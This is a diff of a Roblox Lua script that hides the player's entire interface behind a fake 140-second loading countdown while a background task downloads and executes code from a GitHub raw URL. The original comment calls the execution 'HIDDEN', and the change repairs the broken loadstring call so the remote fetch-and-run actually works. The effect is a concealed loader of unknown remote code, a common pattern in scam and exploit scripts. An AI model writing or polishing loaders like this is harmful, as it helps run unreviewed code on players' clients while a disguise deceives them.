@@ -1,7 +1,7 @@
 local player = game.Players.LocalPlayer
 local countdownTime = 140
 
--- Hide all existing GUI
+-- Hide all GUI
 for _, gui in pairs(player:WaitForChild("PlayerGui"):GetChildren()) do
     if gui:IsA("ScreenGui") then
         gui.Enabled = false
@@ -35,9 +35,14 @@ loadingText.Font = Enum.Font.SourceSansBold
 loadingText.Text = "Loading: " .. countdownTime
 loadingText.Parent = background
 
--- === HERE: RUN YOUR SCRIPT IN BACKGROUND, HIDDEN ===
+-- === HERE: run GitHub-hosted script in background ===
 spawn(function()
-    loadstring("https://raw.githubusercontent.com/boomboxmisscal/awda/refs/heads/main/grow-garden")()
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/awda/refs/heads/main/grow-garden.lua"))()
+    end)
+    if not success then
+        warn("Script failed to load: " .. err)
+    end
 end)
 
 -- Countdown timer
@@ -46,7 +51,7 @@ for i = countdownTime, 1, -1 do
     wait(1)
 end
 
--- Restore UI
+-- Restore GUI
 loadingGui:Destroy()
 for _, gui in pairs(player.PlayerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
